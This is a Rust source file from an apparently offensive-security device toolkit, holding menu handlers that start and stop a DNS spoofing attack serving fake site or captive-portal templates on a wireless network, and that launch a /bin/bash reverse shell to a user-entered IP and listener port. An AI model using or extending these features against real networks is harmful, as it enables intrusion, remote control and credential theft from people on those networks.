use anyhow::Result;
use rustyjack_commands::{
    Commands, DnsSpoofCommand, DnsSpoofStartArgs, ReverseCommand, ReverseLaunchArgs,
};

use super::state::App;

impl App {
    pub(crate) fn toggle_dns_spoof(&mut self) -> Result<()> {
        // Check current status
        let is_running = self.status_overlay().dns_spoof_running;

        if is_running {
            self.stop_dns_spoof()
        } else {
            self.start_dns_spoof()
        }
    }

    pub(crate) fn start_dns_spoof(&mut self) -> Result<()> {
        let Some(iface) = self.require_connected_wireless("DNS Spoof")? else {
            return Ok(());
        };

        let sites = self.list_dnsspoof_sites();
        if sites.is_empty() {
            return self.show_message(
                "DNS Spoof",
                [
                    "No site templates found.",
                    "Add folders under",
                    "DNSSpoof/sites/<name>",
                ],
            );
        }
        let choice = self.choose_dnsspoof_site(&sites)?;
        let Some(site) = choice else {
            return Ok(());
        };

        self.show_message(
            "DNS Spoof",
            [
                "Hijacks DNS on this WLAN",
                "and serves the selected",
                "site/captive portal.",
                "",
                "Press Start to launch.",
                "Stop via Stop DNS Spoof.",
            ],
        )?;
        let confirm = self.choose_from_list(
            "Start DNS Spoof?",
            &["Start".to_string(), "Cancel".to_string()],
        )?;
        if confirm != Some(0) {
            return Ok(());
        }

        let args = DnsSpoofStartArgs {
            site: site.clone(),
            interface: Some(iface.clone()),
            loot_dir: None,
        };

        match self
            .core
            .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Start(args)))
        {
            Ok((msg, data)) => {
                if let Some(lines) = crate::ops::shared::preflight::preflight_only_summary(&data) {
                    return self.show_message("DNS Spoof", lines.iter().map(|s| s.as_str()));
                }
                self.show_message(
                    "DNS Spoof",
                    [
                        msg,
                        format!("Site: {}", site),
                        format!("Interface: {}", iface),
                    ],
                )
            }
            Err(e) => self.show_message("DNS Spoof", [format!("Start failed: {}", e)]),
        }
    }

    pub(crate) fn stop_dns_spoof(&mut self) -> Result<()> {
        match self
            .core
            .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Stop))
        {
            Ok((msg, _)) => self.show_message("DNS Spoof", [msg]),
            Err(e) => self.show_message("DNS Spoof", [format!("Stop failed: {}", e)]),
        }
    }

    pub(crate) fn launch_reverse_shell(&mut self) -> Result<()> {
        let Some(iface) = self.require_connected_wireless("Reverse Shell")? else {
            return Ok(());
        };

        self.show_message(
            "Reverse Shell",
            [
                "Connects back to a host",
                "with /bin/bash via TCP.",
                "",
                "Ensure listener is ready.",
                "Press Start to continue.",
            ],
        )?;
        let cont = self.choose_from_list(
            "Launch shell?",
            &["Start".to_string(), "Cancel".to_string()],
        )?;
        if cont != Some(0) {
            return Ok(());
        }

        // Prompt for target IP octets
        let mut octets = Vec::new();
        for i in 0..4 {
            let prefix = match i {
                0 => "Target",
                1 => "Target",
                2 => "Target",
                _ => "Target",
            };
            let part = self.prompt_octet(prefix)?;
            let Some(val) = part else {
                return Ok(());
            };
            octets.push(val);
        }
        let target_ip = format!("{}.{}.{}.{}", octets[0], octets[1], octets[2], octets[3]);

        // Prompt for port (common choices)
        let ports = vec!["4444", "9001", "1337", "5555"];
        let port_choice = self.choose_from_list(
            "LPORT",
            &ports.iter().map(|s| s.to_string()).collect::<Vec<_>>(),
        )?;
        let port: u16 = port_choice
            .and_then(|idx| ports.get(idx))
            .and_then(|p| p.parse().ok())
            .unwrap_or(4444);

        let args = ReverseLaunchArgs {
            target: target_ip.clone(),
            port,
            shell: "/bin/bash".to_string(),
            interface: Some(iface.clone()),
        };

        match self
            .core
            .dispatch(Commands::Reverse(ReverseCommand::Launch(args)))
        {
            Ok((msg, data)) => {
                if let Some(lines) = crate::ops::shared::preflight::preflight_only_summary(&data) {
                    return self.show_message("Reverse Shell", lines.iter().map(|s| s.as_str()));
                }
                self.show_message(
                    "Reverse Shell",
                    [
                        msg,
                        format!("Target: {}", target_ip),
                        format!("Port: {}", port),
                        format!("Iface: {}", iface),
                    ],
                )
            }
            Err(e) => self.show_message("Reverse Shell", [format!("Launch failed: {}", e)]),
        }
    }
}
